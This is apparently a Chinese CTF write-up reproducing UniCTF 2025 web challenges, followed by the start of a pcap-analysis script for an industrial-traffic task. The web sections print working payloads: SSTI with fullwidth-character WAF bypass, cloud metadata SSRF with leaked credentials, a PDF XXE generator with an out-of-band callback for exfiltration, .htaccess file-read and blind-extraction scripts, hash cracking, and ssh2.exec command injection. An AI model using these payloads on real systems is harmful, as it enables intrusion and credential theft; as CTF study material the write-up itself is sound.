---
title: unictf2025复现
date: 2026-03-08 14:08:21
tags:
- ssti
- 全角符号绕过
- 云元数据服务泄露
- apache表达式注入
- RewriteEngine重写引擎利用expr
- .htaccess
- pdf-xfa-xxe
- 文件名爆破
- ffuf爆破命令
- hash解密
- ssh2模块
- DNS隧道
- base32
category:
- 比赛复现
---

# unictf2025复现

## WEB

### GlyphWeaver

开启题目是一个名片生成工具，提供“预览”和“导出”两条渲染链路。

尝试模板表达式 `{{7*7}}` 被拦截，说明存在模板语法防护

页面上方提示 `CJK-friendly`，也就是中日韩文友好。在实际场景里，这通常意味着对Unicode兼容字符做规范化处理（NFKC），例如全角括号会折叠为半角 `{}`。

![](../image/unictf2026-1.png)

这提示我们输入在渲染前会被改写，而经过测试， WAF 只扫描原始输入，不做 NFKC，因此waf存在对unicode编码后内容检测的失配

使用全角花括号：`｛｛7*7｝｝`。输出里被折叠成了 ASCII `{}`，说明确实发生了 NFKC 规范化：

但是我们发现此时 payload 仍未执行，说明预览仅有一次渲染，需要寻找二次渲染触发点。

---

下滑发现导出功能，可生成 taskId 并导出结果：

导出链路执行stage1 -> stage2：

- stage1 将输入渲染进卡片模板，此时 `{{...}}` 仍是普通字符串
- stage2 再把 stage1 结果作为模板渲染，`{{...}}` 被真正执行

使用中文符号绕过waf

中文符号生成器（全角半角转换器）中文是全角字符

https://www.iamwawa.cn/quanjiaobanjiao.html

**所以半角转全角，可以只转符号不转字母，也可以都转**

```
半角
{{7*7}}

全角
｛｛7*7｝｝
```

发现可以渲染出现结果49，存在ssti

最终payload

```
｛｛lipsum.＿＿globals＿＿［＇os＇］．popen（＇cat /flag＇）.read（）｝｝

｛｛cycler．＿＿init＿＿．＿＿globals＿＿．＿＿builtins＿＿．open（'/flag'）．read（）｝｝
```

---

### CloudDiag

开启环境，看到登录框，发现注册没用，直接弱口令

```
root
root123
```

登录后进入 Tasks 列表，可以看到 root 的历史任务`Legacy metadata check`。进入任务详情页可见曾经访问的 Config URL：

这是一个模拟的**云诊断管理面板**

![](../image/unictf2026-2.png)

这个 **Legacy metadata check** 任务页面实际上是在**模拟一个云诊断工具的执行过程**，并且**故意暴露了关键信息**。

 **1. Config URL（配置URL）**

```
http://metadata:1338/latest/meta-data/iam/security-credentials/
```

- **这是云元数据服务的内部地址**（模拟AWS的169.254.169.254）
- `/latest/meta-data/iam/security-credentials/` 是获取**实例角色凭证**的路径

 **2. Config Preview（配置预览）**

```
clouddiag-instance-role
```

- **这是一个IAM角色名称**（就像云上的一个身份）
- 这个结果显示：元数据服务返回了这个实例被授予的角色名

 **3. Parsed Config (parse failed)**

- 诊断工具试图解析返回的数据，但**失败了**
- 为什么会失败？因为元数据服务返回的是**纯文本角色名**，但工具可能期望的是JSON格式（凭证信息）

 **4. Execution Log（执行日志）**

```
[INFO] Scheduled diagnostic run
[INFO] Parsed config successfully   <-- 注意这里！
[INFO] Report uploaded to object storage
```

---

其中返回的clouddiag-instance-role对应的就是题目中角色名，可以通过

http://metadata:1338/latest/meta-data/iam/security-credentials/<role-name>

的方式返回角色的临时凭证（AK/SK/Token）

也可以看出，该url看起来像是内网域名，因此，通过New task模块，填写Config URL为`http://metadata:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-role`

这里可以看做是SSRF漏洞，new tasks是接口

回显是一个JSON，包含了临时凭证AK、SK、Token

```
{
  "AccessKeyId": "AKIA9317E2A80D4F48FB",
  "Code": "Success",
  "Expiration": "2026-03-09T12:26:55.474078Z",
  "SecretAccessKey": "2f7c228c603b4ece94c2b4db3423065a7130184f47614eb5b070bea45408eec1",
  "Token": "d116b16370ea4dc79135c6e563fc3d80253577d048b74eb984560d3f314c076c",
  "Type": "AWS-HMAC"
}
```

---

使用本平台的`Cloud Explorer`模块，填入获取到的AK、SK、Token

首先，仅填写ak、sk、token时，列出来三个桶

查看其中的clouddiag-secrets

进一步填写Prefix和Object Key获取flag 

```
AKIA9317E2A80D4F48FB
2f7c228c603b4ece94c2b4db3423065a7130184f47614eb5b070bea45408eec1
d116b16370ea4dc79135c6e563fc3d80253577d048b74eb984560d3f314c076c
clouddiag-secrets
flags/runtime
flag-ab2989b032c54b188c2f5770e9eb5f3c.txt
```

---

### SecureDoc

CVE-2025-66516

直接用poc

#### pdf-xfa-xxe-generator.py基本使用方法

1. 首先查看可用的攻击模式

```
python pdf-xfa-xxe-generator.py --list-modes
```

2. 基本文件读取

```
# 读取/etc/passwd文件
python pdf-xfa-xxe-generator.py --target /etc/passwd --output exploit.pdf

# 读取环境变量
python pdf-xfa-xxe-generator.py --target /proc/self/environ --output environ.pdf
```

3. 云元数据攻击

```
# AWS元数据
python pdf-xfa-xxe-generator.py --target http://169.254.169.254/latest/meta-data/ --output aws.pdf

# 获取AWS IAM凭证
python pdf-xfa-xxe-generator.py --target http://169.254.169.254/latest/meta-data/iam/security-credentials/ --output aws_creds.pdf

# GCP元数据
python pdf-xfa-xxe-generator.py --target http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token --output gcp.pdf
```

4. 使用预定义模式

```
# 生成所有AWS元数据payloads
python pdf-xfa-xxe-generator.py --mode aws_metadata --all-targets --output ./aws_payloads/

# 生成Kubernetes secrets payloads
python pdf-xfa-xxe-generator.py --mode k8s_secrets --all-targets --output ./k8s_payloads/

# 生成SSH私钥payload
python pdf-xfa-xxe-generator.py --mode ssh_keys --output ssh_key.pdf
```

5. OOB（带外）数据外传

```
# 1. 先在一台公网服务器上启动HTTP服务接收数据
python -m http.server 8080

# 2. 生成OOB payload
python pdf-xfa-xxe-generator.py --target /etc/passwd --callback http://你的公网IP:8080 --output oob.pdf
```

---

#### payload

直接生成

```
python pdf-xfa-xxe-generator.py --target /flag --output exploit.pdf
```

然后上传即可拿到flag

---

### ez Upload & ez Upload Revenge

这里有两种解法

一种是.htaccess利用，apache的RewriteEngine重写引擎利用expr

另一种是Apache .htaccess 盲注

#### 解法一 RewriteEngine重写引擎利用expr

流程图

<img src="../image/unictf2026-3.png" style="zoom:80%;" />

**payload如下**

```
RewriteEngine On
RewriteCond expr "file('/flag') =~ /(.+)/"
RewriteRule .* - [E=FLAG_CONTENT:%1]
Header set X-Test-Expr "%{FLAG_CONTENT}e"
```

**payload详细解释：**

```
RewriteEngine On
```

启用 Apache 的 mod_rewrite 模块。

```
RewriteCond expr "file('/flag') =~ /(.+)/"
```

这一行是核心。

- `expr` 是 Apache **表达式解析器**(ap_expr)，支持调用一些函数。
- `file('/flag')` 尝试读取服务器文件系统中的 `/flag` 文件内容。
- `=~ /(.+)/` 是正则表达式匹配，`(.+)` 匹配所有内容并捕获到变量 `%1`。

**关键点**：如果 `/flag` 文件存在且可读，这个条件成立，并且文件内容被捕获到 `%1`。

```
RewriteRule .* - [E=FLAG_CONTENT:%1]
```

- `.*` 匹配所有请求。
- `-` 表示不重写 URL。
- `[E=FLAG_CONTENT:%1]` 设置环境变量 `FLAG_CONTENT` 的值为前面捕获的 `%1`（即 flag 文件内容）。

```
Header set X-Test-Expr "%{FLAG_CONTENT}e"
```

- `Header set` 添加 HTTP 响应头。
- `X-Test-Expr` 是自定义头名称。
- `%{FLAG_CONTENT}e` 引用环境变量 `FLAG_CONTENT` 的值

**最终效果**：服务器会在 HTTP 响应中添加一个头：

```
X-Test-Expr: flag{...实际内容...}
```

先上传.htaccess文件

然后新建一个任意文件访问即可在响应头里看到flag

---

#### 解法二 Apache .htaccess 盲注

```
漏洞点：Apache 表达式注入 (Expression Injection)
虽然题目禁用了尖括号 <If>，但 Apache 的 RewriteCond 指令本身支持 expr 参数（Apache 2.4+）。 expr 允许调用内置函数，其中 file() 函数可以读取服务器本地文件的内容

判定条件：利用 file('/flag') =~ /正则/ 匹配 flag 内容。
触发信号：如果匹配成功，执行 RewriteRule . - [F]（强制返回 403 Forbidden）；如果匹配失败，则正常返回 200 OK。
```

```
RewriteEngine On
# 逻辑：读取 /flag 文件，若以 UniCTF 开头且后续字符匹配，则报错
RewriteCond expr "file('/flag') =~ /^UniCTF.内容.*/"
RewriteRule . - [F]
```

python脚本：

```
import requests
import string
import time

url = "http://80-187b67ef-320c-4e03-a718-b135a6b3dce6.challenge.ctfplus.cn/"
verify_url = url + "upload/1.png"

# 字符集去掉大括号，避免干扰，重点跑内部内容
charset = string.ascii_letters + string.digits + "_-!"

# 我们假设格式是 UniCTF{...}
# 用 . 匹配那个可能是 { 的字符
flag = "UniCTF."


def check(prefix):
    # 这里我们不对 prefix 进行全量转义，只处理内部可能出现的特殊字符
    # 构造 payload：file('/flag') =~ /^UniCTF.内部内容/
    content = f"""
RewriteEngine On
RewriteCond expr "file('/flag') =~ /^{prefix}/"
RewriteRule . - [F]
"""
    files = {'file': ('.htaccess', content)}
    try:
        # 建议每次上传前先传个空的，清空缓存状态
        # requests.post(url, files={'file': ('.htaccess', ' ')})

        requests.post(url, files=files, timeout=5)
        r = requests.get(verify_url, timeout=5)
        return r.status_code == 403
    except:
        return False


print("--- Bypassing { and scanning content ---")

while True:
    found = False
    for char in charset:
        test_flag = flag + char
        print(f"\rTesting: {test_flag}", end="")

        if check(test_flag):
            flag += char
            print(f"\n[+] Found char! Current string: {flag}")
            found = True
            break

    if not found:
        # 如果跑不动了，尝试补一个 } 看看是否结束
        if check(flag + "}"):
            flag += "}"
            print(f"\n[+] Found end of flag: {flag}")
        break

# 最后把第一个点换回 {
final_flag = flag.replace("UniCTF.", "UniCTF{", 1)
print(f"\n[!] Likely Flag: {final_flag}")
```

---

### Intrasight

127.0.0.1:8001 (admin_panel)：管理面板，负责 Token 分发和调试信息显示
http://127.0.0.1:8001/redirect_ws?token=flag *[#获取token](javascript:;)*
127.0.0.1:9000 (Weaver Service)：后端 WebSocket 渲染引擎，负责处理模板预览

该 Token 具有强时效性且为单次使用，必须在后续请求中通过 X-Internal-Token 请求头和 URL 参数同步传递，才能维持身份有效性

重点 WebSocket 协议走私与渲染触发
根据题目 测试出 ws_render
Weaver 服务的 action: render 接收 template 参数，且未对输入进行过滤

python脚本：

```
import requests
import re
import json

BASE_HOST = "80-d4d250d7-b1d1-43e6-84aa-c7a4a1b74221.challenge.ctfplus.cn"

def get_token():
    # 1. 获取新鲜 Token
    url = f"http://{BASE_HOST}/fetch?url=http://127.0.0.1:8001/redirect_ws?token=flag"
    r = requests.get(url)
    token = re.search(r'token=([a-f0-9]{32})', r.text).group(1)
    return token

token = get_token()
print(f"[*] 激活 Token: {token}")

# 2. 构造攻击 URL
# 尝试将 Payload 通过渲染器的指令参数进行注入
# 这里有几种可能的参数名：msg, cmd, 或 template
attack_url = f"http://{BASE_HOST}/fetch"

# 尝试绕过限制的 Payload
# 如果 {{7*7}} 成功，响应里会出现 49
payload = "{{lipsum.__globals__['os'].popen('cat /flag').read()}}"

params = {
    "url": f"ws://127.0.0.1:9000/ws?token={token}",
    "ws_render": "true",
    "template": payload  # 尝试直接作为参数传递
}

headers = {
    "X-Internal-Token": token,
    "Origin": "http://127.0.0.1",
    "Content-Type": "application/json"
}

print(f"[*] 正在通过渲染器发送 Payload...")

# 尝试 GET 方式（有些 SSRF 只支持 GET）
r_get = requests.get(attack_url, params=params, headers=headers)
print("\n[!] GET 方式响应:")
print(r_get.text)

# 尝试 POST 方式（模拟 WebSocket 握手后的指令发送）
post_data = {
    "action": "render",
    "template": payload,
    "context": {}
}
r_post = requests.post(attack_url, params={"ws_render": "true", "url": params["url"]}, 
                       json=post_data, headers=headers)
print("\n[!] POST 方式响应:")
print(r_post.text)
```

这个脚本通过**SSRF漏洞获取内部WebSocket服务的token，然后利用WebSocket连接进行Jinja2模板注入（SSTI），执行系统命令读取flag**。

**原理：**

 **第1部分：获取Token**

```
def get_token():
    url = f"http://{BASE_HOST}/fetch?url=http://127.0.0.1:8001/redirect_ws?token=flag"
    r = requests.get(url)
    token = re.search(r'token=([a-f0-9]{32})', r.text).group(1)
    return token
```

 **原理：**

1. **`/fetch`端点**：存在SSRF漏洞，可以请求任意URL
2. **内网服务**：`127.0.0.1:8001/redirect_ws`是内部服务，用于生成WebSocket连接的token
3. **token格式**：32位十六进制数（MD5长度）
4. **攻击思路**：通过SSRF访问内部API获取token，绕过外部访问限制

------

 **第2部分：WebSocket连接**

```
attack_url = f"http://{BASE_HOST}/fetch"
params = {
    "url": f"ws://127.0.0.1:9000/ws?token={token}",
    "ws_render": "true",
    "template": payload
}
```

 **原理：**

1. **WebSocket协议**：`ws://`表示WebSocket连接，不同于HTTP
2. **内网服务**：`127.0.0.1:9000/ws`是内部WebSocket服务
3. **ws_render参数**：告诉服务器要通过WebSocket进行模板渲染
4. **template参数**：要渲染的模板内容（SSTI注入点）

------

 **第3部分：SSTI Payload**

```
payload = "{{lipsum.__globals__['os'].popen('cat /flag').read()}}"
```

 **原理（Jinja2 SSTI）：**

1. **`{{ ... }}`**：Jinja2模板引擎的表达式语法
2. **`lipsum`**：Jinja2的全局变量，可以访问`__globals__`
3. **`__globals__`**：Python的全局变量字典
4. **`['os']`**：导入os模块
5. **`popen('cat /flag').read()`**：执行系统命令读取flag

**攻击链：**

```
模板注入 → 访问全局变量 → 导入os模块 → 执行命令 → 读取flag
```

------

 **第4部分：两种攻击方式**

 **GET方式**

```
r_get = requests.get(attack_url, params=params, headers=headers)
```

- 参数在URL中传递
- 适合简单的SSRF利用
- 可能受URL长度限制

 **POST方式**

```
post_data = {
    "action": "render",
    "template": payload,
    "context": {}
}
r_post = requests.post(attack_url, params={"ws_render": "true", "url": params["url"]}, 
                       json=post_data, headers=headers)
```

- 模拟WebSocket握手后的指令发送
- `action: render`表示执行渲染操作
- `context`是模板上下文变量
- 更接近真实的WebSocket交互

------

 **第5部分：关键Header**

```
headers = {
    "X-Internal-Token": token,  # 内部认证
    "Origin": "http://127.0.0.1",  # 伪造本地来源
    "Content-Type": "application/json"
}
```

 **原理：**

1. **`X-Internal-Token`**：内部服务认证，防止未授权访问
2. **`Origin: 127.0.0.1`**：伪造请求来自本地，绕过CORS和IP限制
3. **`Content-Type: application/json`**：告诉服务器发送的是JSON数据

---

### 一鸣唱吧

上传一个文件会得到它的保存目录：`uploads/UNiCTF202604.txt`

再次上传，会发现规律。

可以发现，当我们上传文件后，会保留上传的后缀名，并且只有后两位数字改变。那么可以遍历一下`uploads`下是否存在其他的文件。

```
seq -w 0 99 > num.txt
然后使用后缀名字典：/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt
也可用这个/usr/share/wordlists/seclists/Discovery/Web-Content/web-mutations.txt
ffuf -u http://80-a7def0a7-af90-4105-88a5-9d5671036a42.challenge.ctfplus.cn/uploads/UNiCTF2026W1W2 -w /home/kali/test/num.txt:W1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt:W2
```

有一个 `UNiCTF202667.db,`和 `UNiCTF202638.php`

查看php文件，发现是phpinfo。

从phpinfo可以看出，导入了`ssh2`模块，得到的一个重要信息。那么我们看一下`db`文件

将其下载下来后。发现是`SQLITE`

用navicat连接，得到一些凭证，admin用户的第三列是1，其余是0，那么判断其可能为网站的管理员用户。

将admin用户的password进行hash解密

```
7fef6171469e80d32c0559f88b377245
```

这里使用crackstation

https://crackstation.net/

得到密码：**admin888**

查看曲库功能，发现多出一个管理员的功能，并且给了提示：可使用`file://`协议。

直接读取`file:///flag`会返回错误。那么试着读取源码。

```
file:///var/www/html/download.php
```

源码：

```
<?php
// 引入数据库连接
require_once 'includes/db.php';

if (session_status() === PHP_SESSION_NONE) { session_start(); }

if (!isset($_SESSION['user'])) {
    require_once 'includes/header.php';
    die("<div class='container'><p class='error'>请先登录会员系统！/ Access Denied</p></div>");
    require_once 'includes/footer.php';
}



if (isset($_GET['preview']) && $_GET['preview'] === "true" && isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1) {
    

    $format = isset($_GET['format']) ? $_GET['format'] : '';

    // ========================================
    // 安全过滤：协议黑名单检查
    // ========================================
    $dangerousProtocols = [
        'php://',
        'data://',
        'phar://',
        'zip://',
        'compress.zlib://',
        'compress.bzip2://',
        'zlib://',
        'glob://',
        'expect://',
        'input://',
        'http://',
        'https://',
        'ftp://',
        'ftps://',
        'dict://',
        'gopher://',
        'tftp://',
        'ldap://',
        'ssh2.sftp://',
        'ssh2.scp://',
        'ssh2.tunnel://',
        'rar://',
        'ogg://',
    ];

    foreach ($dangerousProtocols as $protocol) {
        if (stripos($format, $protocol) !== false) {
            require_once 'includes/header.php';
            echo "<div class='container'>";
            echo "<p class='error'>⚠️ 安全警告：禁止使用该协议 " . htmlspecialchars($protocol) . "</p>";
            echo "<p>系统检测到潜在的安全风险，已拦截此次请求。</p>";
            echo "</div>";
            require_once 'includes/footer.php';
            exit;
        }
    }
    // ========================================

    $full_path = $format;

    $is_viewing_source = (strpos($format, 'file://') === 0);

    if ($is_viewing_source) {
        header('Content-Type: text/plain; charset=utf-8');
    } else {
        header('Content-Type: text/html; charset=utf-8');
        require_once 'includes/header.php';
        echo "<div class='container'><h2 class='neon-text'>🔧 管理员预览控制台</h2>";
        echo "<p class='message'>正在尝试加载资源流: <strong>" . htmlspecialchars($full_path) . "</strong></p>";
        echo "<div style='background: #000; padding: 15px; border: 1px solid #333; font-family: monospace; color: #0f0; white-space: pre-wrap;'>";
    }

    try {

        $handle = @fopen($full_path, 'r');

        if ($handle) {
            $content = stream_get_contents($handle);
            
            if ($is_viewing_source) {
                echo $content; 
            } else {
                echo htmlspecialchars($content); 
            }
            fclose($handle);
        } else {
            echo "Error: 资源加载失败。\n";
            echo "可能的原因为：\n";
            echo "1. 文件路径不存在\n";
            echo "2. 权限不足 (Permission Denied)\n";
            echo "3. 协议格式错误\n";
        }

    } catch (Exception $e) {
        echo "System Error: " . $e->getMessage();
    }


    if (!$is_viewing_source) {
        echo "</div></div>"; // 关闭 console 和 container
        require_once 'includes/footer.php';
    }
    
    exit; 

}



//普通会员文件下载

require_once 'includes/header.php';

if (isset($_GET['file'])) {
    $file = $_GET['file'];

    if (strpos($file, '..') === false && strpos($file, '/') === false) {
        $filepath = "uploads/" . $file;
        if (file_exists($filepath)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
            header('Content-Length: ' . filesize($filepath));
            readfile($filepath);
            exit;
        } else {
             echo "<p class='error'>文件不存在或已被移除。</p>";
        }
    } else {
         echo "<p class='error'>非法请求。</p>";
    }
}

$admin_panel = '';
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1) {
    $current_dir = __DIR__; 
    $admin_panel = <<<HTML
    <div class="admin-panel">
        <h3 class="neon-text">🔧 管理员内部预览 (Dev Mode)</h3>
        <p style="color: gray; font-size: 0.8em;">当前 Web 根目录: {$current_dir}</p>
        
        <form method="get" target="_blank">
            <input type="hidden" name="preview" value="true">
            <label>Resource URI:</label>
            <input type="text" name="format" placeholder="例如: file://{$current_dir}/index.php" style="width: 70%;" required>
            <button type="submit">加载资源</button>
        </form>
    </div>
HTML;
}
?>

<h2 class="neon-text">🎵 一鸣曲库 (归档中心)</h2>
<p>这里存放着系统归档文件。普通会员可根据文件名下载。</p>

<div style="margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.3);">
    <h3>📥 歌曲/文件下载</h3>
    <form method="get">
        文件名: <input type="text" name="file" placeholder="输入文件名, 如 MGSG202500.mp3">
        <button type="submit">下载文件</button>
    </form>
</div>

<?php 
echo $admin_panel;
require_once 'includes/footer.php'; 
?>
```

传入的协议会通过`fopen`，此函数支持流封装协议。根据`ssh2`模块的定义，其中有一个`ssh2.exec://`协议，该协议可以在远程ssh上执行命令。但需要获得一个ssh用户的凭证。

该协议的格式是这样的：`ssh2.exec://user:pass@ip/cmd`

```
# 1. 破解 MD5 hash
hashcat -a 0 -m 0 58d506617a1e20a9d87ab5a3debcb151 /usr/share/wordlists/rockyou.txt

# 2. 查看破解结果
hashcat -a 0 -m 0 58d506617a1e20a9d87ab5a3debcb151 --show

58d506617a1e20a9d87ab5a3debcb151:duhgrl
```

解密得到`ctfer`的密码 `duhgrl`

**尝试写入文件。**

```
download.php?preview=true&format=ssh2.exec://ctfer:duhgrl@127.0.0.1:22/ls /+>+/var/www/html/1.txt
```

然后访问1.txt

```
bin
boot
dev
etc
flflagag1SH3re
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

**读取flag然后写入文件flag.txt**

```
download.php?preview=true&format=ssh2.exec://ctfer:duhgrl@127.0.0.1:22/cat /flflagag1SH3re+>+/var/www/html/flag.txt
```

---

## MISC

### 工厂应急流量分析

```
任务 1：谁把阀门打开了？
2.00 分
找到 Modbus 打开阀门指令的相关信息。

提交格式：flag{0xtransaction_id_0xfunction_code_0xcoil_address}
请输入 Flag...
验证
任务 2：被读取的 NodeId
2.00 分
找到通过 OPC UA 协议读取的 NodeId。

提交格式：flag{ns=X;s=Path/To/Node}
请输入 Flag...
验证
任务 3：控制站域名解析结果
2.00 分
找出控制站域名 ctrlws.factory.local 的解析 IP。

提交格式：flag{IP地址}
请输入 Flag...
验证
任务 4：连接建立时间
2.00 分
确定SCADA（源：192.168.1.5）到控制站（目的：192.168.1.10）上首个成功发起的时间点(UTC)。

提交格式：flag{YYYY-MM-DDTHH:MM:SSZ}
请输入 Flag...
验证
任务 5：HTTP 请求痕迹
2.00 分
提取 SCADA 对控制站发起的 HTTP 请求的 Host 与 URI。

提交格式：flag{Host_URI}
请输入 Flag...
验证
任务 6：ICMP Echo Request 序列号
2.00 分
攻击者（192.168.1.100）对控制站发起了 ICMP Echo Request（ping）。找出该 ICMP 请求的序列号（Sequence Number）。

提交格式：flag{0x序列号}
请输入 Flag...
验证
任务 7：SNMP Get 请求的 OID
2.00 分
SCADA 对控制站发起了 SNMP Get 请求。找出该请求查询的 OID（Object Identifier）。

提交格式：flag{OID}
请输入 Flag...
验证
```

直接脚本梭了

```
#!/usr/bin/env python3
"""
工厂应急响应 - 新题目完整解题脚本
一次性输出所有7个flag
"""

from scapy.all import *
from datetime import datetime, timezone


def solve_all_flags(filename):
    print("=" * 80)
    print("工厂应急响应 - 自动解题脚本（新题目）")
    print("=" * 80)
    print(f"\n[*] 正在读取 {filename}...")
    pkts = rdpcap(filename)
    print(f"[*] 总共 {len(pkts)} 个数据包\n")

    flags = {}

    # ========================================================================
    # Q1: 谁把阀门打开了？(Modbus)
    # ========================================================================
    print("\n" + "=" * 80)
    print("Q1: 谁把阀门打开了？")
    print("=" * 80)

    for pkt in pkts:
        if TCP in pkt and (pkt[TCP].dport == 502 or pkt[TCP].sport == 502):
            if Raw in pkt:
                payload = bytes(pkt[Raw].load)
                if len(payload) >= 12:
                    trans_id = int.from_bytes(payload[0:2], 'big')
                    func_code = payload[7]

                    # Function code 5 = Write Single Coil
                    if func_code == 5:
                        coil_addr = int.from_bytes(payload[8:10], 'big')
                        coil_value = int.from_bytes(payload[10:12], 'big')

                        if coil_value == 0xFF00:  # ON (Modbus中0xFF00表示ON)
                            print(f"找到打开阀门的操作:")
                            print(f"  Transaction ID: 0x{trans_id:04x}")
                            print(f"  Function Code: 0x{func_code:02x}")
                            print(f"  Coil Address: 0x{coil_addr:04x}")
                            print(f"  Coil Value: 0x{coil_value:04x} (ON)")

                            flags['Q1'] = f"flag{{0x{trans_id:04x}_0x{func_code:02x}_0x{coil_addr:04x}}}"
                            print(f"\n✅ Q1答案: {flags['Q1']}")
                            break

    # ========================================================================
    # Q2: 被读取的NodeId (OPC UA)
    # ========================================================================
    print("\n" + "=" * 80)
    print("Q2: 被读取的NodeId")
    print("=" * 80)

    for pkt in pkts:
        if TCP in pkt and (pkt[TCP].dport == 4840 or pkt[TCP].sport == 4840):
            if Raw in pkt:
                payload = bytes(pkt[Raw].load)
                if b'ReadRequest' in payload:
                    try:
                        text = payload.decode('utf-8', errors='ignore')
                        if 'NodeId=' in text:
                            start = text.find('NodeId=')
                            # 查找NodeId的结束位置（可能是分号、换行或其他分隔符）
                            # 先查找分号，但要确保不是NodeId内部的分号（如ns=2;s=...）
                            # 查找第一个不在引号内的分号，或者换行符
                            end = len(text)
                            for i in range(start + 7, len(text)):
                                if text[i] == ';' and i > start + 20:  # 确保不是NodeId内部的分号
                                    # 检查这个分号后面是否跟着另一个字段名（如MaxAge）
                                    if i + 1 < len(text) and text[i+1:i+7].isalpha():
                                        end = i
                                        break
                                elif text[i] == '\n' or text[i] == '\r':
                                    end = i
                                    break
                            
                            if end > start:
                                nodeid = text[start + 7:end].strip()
                                print(f"找到OPC UA读取操作:")
                                print(f"  完整内容片段: {text[start:start+200]}")
                                print(f"  被读取的NodeId: {nodeid}")

                                flags['Q2'] = f"flag{{{nodeid}}}"
                                print(f"\n✅ Q2答案: {flags['Q2']}")
                                break
                    except Exception as e:
                        pass

    # ========================================================================
    # Q3: 控制站域名解析结果
    # ========================================================================
    print("\n" + "=" * 80)
    print("Q3: 控制站域名解析结果")
    print("=" * 80)

    for pkt in pkts:
        if DNS in pkt and pkt.haslayer(DNSRR):
            for i in range(pkt[DNS].ancount):
                dnsrr = pkt[DNS].an[i]
                if dnsrr.type == 1:  # A record
                    qname = dnsrr.rrname.decode() if isinstance(dnsrr.rrname, bytes) else str(dnsrr.rrname)
                    if 'ctrlws.factory.local' in qname:
                        ip = dnsrr.rdata
                        if isinstance(ip, bytes):
                            ip = '.'.join(map(str, ip))
                        if '192.168.1.' in str(ip):
                            print(f"找到控制站域名解析:")
                            print(f"  域名: {qname}")
                            print(f"  解析IP: {ip}")

                            flags['Q3'] = f"flag{{{ip}}}"
                            print(f"\n✅ Q3答案: {flags['Q3']}")
                            break
            if 'Q3' in flags:
                break

    # ========================================================================
    # Q4: SCADA到控制站首个成功发起的时间点
    # ========================================================================
    print("\n" + "=" * 80)
    print("Q4: SCADA到控制站首个成功发起的时间点")
    print("=" * 80)

    # 从Q3得知控制站IP
    ctrlws_ip = flags['Q3'].split('{')[1].split('}')[0] if 'Q3' in flags else "192.168.1.10"
    scada_ip = "192.168.1.5"

    # 找到第一个SYN包
    syn_pkt = None
    for pkt in pkts:
        if TCP in pkt and IP in pkt:
            if (pkt[IP].src == scada_ip and pkt[IP].dst == ctrlws_ip and
                    pkt[TCP].flags == 0x02):  # SYN
                syn_pkt = pkt
                break

    # 找到对应的SYN-ACK
    syn_ack_pkt = None
    if syn_pkt:
        for pkt in pkts:
            if TCP in pkt and IP in pkt:
                if (pkt[IP].src == ctrlws_ip and pkt[IP].dst == scada_ip and
                        pkt[TCP].sport == syn_pkt[TCP].dport and
                        pkt[TCP].dport == syn_pkt[TCP].sport and
                        pkt[TCP].flags == 0x12):  # SYN-ACK
                    syn_ack_pkt = pkt
                    break

    # 找到对应的ACK（三次握手完成）
    if syn_ack_pkt:
        for pkt in pkts:
            if TCP in pkt and IP in pkt:
                if (pkt[IP].src == scada_ip and pkt[IP].dst == ctrlws_ip and
                        pkt[TCP].sport == syn_pkt[TCP].sport and
                        pkt[TCP].dport == syn_pkt[TCP].dport and
                        pkt[TCP].flags == 0x10 and  # ACK
                        pkt.time > syn_ack_pkt.time):
                    utc_time = datetime.fromtimestamp(float(pkt.time), tz=timezone.utc)
                    time_str = utc_time.strftime('%Y-%m-%dT%H:%M:%SZ')

                    print(f"找到SCADA到控制站的首个成功连接:")
                    print(f"  SCADA: {scada_ip}")
                    print(f"  控制站: {ctrlws_ip}")
                    print(
                        f"  SYN时间: {datetime.fromtimestamp(float(syn_pkt.time), tz=timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}")
                    print(f"  ACK时间（连接成功）: {time_str}")

                    flags['Q4'] = f"flag{{{time_str}}}"
                    print(f"\n✅ Q4答案: {flags['Q4']}")
                    break

    # ========================================================================
    # Q5: SCADA对控制站的HTTP请求
    # ========================================================================
    print("\n" + "=" * 80)
    print("Q5: SCADA对控制站的HTTP请求")
    print("=" * 80)

    for pkt in pkts:
        if TCP in pkt and Raw in pkt and IP in pkt:
            payload = bytes(pkt[Raw].load)
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst

            # 查找从SCADA到控制站的HTTP请求
            if (b'POST ' in payload or b'GET ' in payload) and b'Host:' in payload:
                if src_ip == scada_ip and dst_ip == ctrlws_ip:
                    try:
                        text = payload.decode('utf-8', errors='ignore')
                        lines = text.split('\n')

                        # 提取方法和URI
                        method_line = lines[0] if lines else ""
                        uri = ""
                        if ' ' in method_line:
                            parts = method_line.split(' ')
                            if len(parts) >= 2:
                                uri = parts[1]

                        # 提取Host
                        host = ""
                        for line in lines:
                            if line.startswith('Host:'):
                                host = line.split('Host:')[1].strip()
                                break

                        if host and uri:
                            print(f"找到SCADA对控制站的HTTP请求:")
                            print(f"  源: {src_ip}")
                            print(f"  目的: {dst_ip}")
                            print(f"  Host: {host}")
                            print(f"  URI: {uri}")
                            print(f"  请求内容:")
                            for line in lines[:8]:
                                print(f"    {line}")

                            answer = f"{host}_{uri}"
                            flags['Q5'] = f"flag{{{answer}}}"
                            print(f"\n✅ Q5答案: {flags['Q5']}")
                            break
                    except Exception as e:
                        pass

    # ========================================================================
    # Q6: ICMP Echo Request的序列号
    # ========================================================================
    print("\n" + "=" * 80)
    print("Q6: ICMP Echo Request的序列号")
    print("=" * 80)

    attacker_ip = "192.168.1.100"
    
    for pkt in pkts:
        if ICMP in pkt and IP in pkt:
            if (pkt[ICMP].type == 8 and  # Echo Request
                    pkt[IP].src == attacker_ip):
                icmp_seq = pkt[ICMP].seq
                icmp_id = pkt[ICMP].id
                print(f"找到ICMP Echo Request:")
                print(f"  源IP: {pkt[IP].src}")
                print(f"  目的IP: {pkt[IP].dst}")
                print(f"  ICMP ID: 0x{icmp_id:04x}")
                print(f"  ICMP序列号: 0x{icmp_seq:04x}")

